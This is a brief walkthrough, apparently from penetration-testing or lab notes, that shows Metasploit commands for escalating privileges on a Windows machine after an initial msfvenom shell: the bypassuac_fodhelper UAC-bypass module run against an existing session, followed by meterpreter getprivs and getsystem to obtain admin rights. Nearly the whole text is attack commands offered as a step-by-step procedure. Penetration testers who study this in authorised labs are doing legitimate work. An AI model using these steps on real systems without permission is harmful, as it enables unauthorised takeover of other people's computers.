**After getting initial shell using msfvenom** ->

```

use exploit/windows/local/bypassuac_fodhelper msf exploit(bypassuac_fodhelper) >set session 1 msf exploit(bypassuac_fodhelper) >exploit

```
->You can see another meterpreter **session 2** opened which means we successfully exploited the target once again now letâ€™s check user privilege

```
metrepreter > getprivs
```

Finally->(privesc)
```
meterpreter > getsystem
```

Check user privs now->
```
metrepreter > getprivs
```
We got admin privilege successfully
